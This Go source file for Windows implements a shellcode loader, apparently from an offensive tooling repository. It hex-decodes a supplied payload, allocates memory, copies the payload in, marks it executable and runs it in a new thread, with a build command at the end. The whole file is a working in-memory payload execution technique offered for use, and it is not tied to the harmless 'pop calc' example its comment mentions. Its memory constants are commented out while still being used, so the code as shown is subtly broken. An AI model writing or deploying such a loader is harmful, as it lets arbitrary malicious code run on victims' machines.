// +build windows

/*
This program executes shellcode in the current process using the following steps
	1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
	3. Change the memory page permissions to Execute/Read with VirtualProtect
	4. Call CreateThread on shellcode address
	5. Call WaitForSingleObject so the program does not end before the shellcode is executed

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
*/

package go_shellcode

import (
	"encoding/hex"
	"errors"
	"fmt"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
// MEM_COMMIT is a Windows constant used with Windows API calls
// MEM_COMMIT = 0x1000
// // MEM_RESERVE is a Windows constant used with Windows API calls
// MEM_RESERVE = 0x2000
// // PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
// PAGE_EXECUTE_READ = 0x20
// // PAGE_READWRITE is a Windows constant used with Windows API calls
// PAGE_READWRITE = 0x04
)

func RunSCcreateThreadNative(sc string, printLevel int) error {
	var verbose, debug bool
	if printLevel > 0 {
		verbose = true
	}
	if printLevel > 1 {
		debug = true
	}
	// Pop Calc Shellcode
	shellcode, errShellcode := hex.DecodeString(sc)
	if errShellcode != nil {
		return errors.New(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	if debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	if debug {
		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
	}
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	if debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
	}
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		return errors.New("[!]VirtualAlloc failed and returned 0")
	}

	if verbose {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
	}

	if debug {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
	}
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}
	if verbose {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if debug {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if verbose {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if debug {
		fmt.Println("[DEBUG]Calling CreateThread...")
	}
	//var lpThreadId uint32
	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
	}
	if verbose {
		fmt.Println("[+]Shellcode Executed")
	}

	if debug {
		fmt.Println("[DEBUG]Calling WaitForSingleObject...")
	}

	_, _, errWaitForSingleObject := WaitForSingleObject.Call(thread, 0xFFFFFFFF)
	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
	}
	return nil
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateThreadNative.exe cmd/CreateThreadNative/main.go
